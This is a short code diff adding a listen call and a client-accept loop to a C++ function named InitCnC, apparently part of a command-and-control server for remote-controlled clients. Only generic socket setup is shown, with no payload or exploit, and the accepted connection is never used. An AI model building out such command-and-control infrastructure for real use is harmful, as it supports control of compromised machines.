@@ -136,7 +136,12 @@ void InitCnC() {
 
 	bind(cnc, (SOCKADDR*)&saIn, sizeof(saIn));
 
+	listen(cnc, MAX_CONN);
 
+	while (!g_bQuit) {
+		SOCKADDR_IN clientIn = { };
+		SOCKET cncClient = accept(cnc, &clientIn, nullptr);
+	}
 }
 
 void ClientThread(std::shared_ptr<Client> client) {
